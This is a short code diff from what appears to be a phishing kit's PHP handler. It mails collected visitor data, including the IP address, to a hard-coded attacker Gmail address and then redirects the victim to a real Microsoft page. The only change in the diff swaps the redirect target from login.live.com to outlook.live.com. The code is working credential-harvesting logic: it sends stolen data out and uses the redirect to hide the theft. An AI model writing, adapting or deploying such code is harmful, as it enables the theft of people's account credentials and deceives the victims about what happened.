@@ -8,5 +8,5 @@ $message .= "IP: ".$ip."\n";
 $recipient ="lavidabroski@gmail.com";
 $subject = "tare | ".$ip."\n";
 mail($recipient,$subject,$message);
-header("Location: https://login.live.com");
+header("Location: https://outlook.live.com");
 ?>
